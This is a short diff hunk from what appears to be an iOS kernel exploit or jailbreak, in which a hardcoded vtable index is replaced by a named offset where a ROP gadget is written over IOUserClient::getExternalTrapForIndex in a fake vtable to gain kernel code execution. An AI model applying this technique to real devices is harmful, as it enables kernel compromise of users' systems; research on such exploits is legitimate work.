@@ -94,7 +94,7 @@ void init_Kernel_Execute(void) {
     // Now the userclient port we have will look into our fake user client rather than the old one
 
     // Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
-    KernelWrite_64bits(FakeVtable+8*0xB7, Find_add_x0_x0_0x40_ret());
+    KernelWrite_64bits(FakeVtable+8*off_getExternelTrapForIndex, Find_add_x0_x0_0x40_ret());
 
     //
     //printf("Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex");
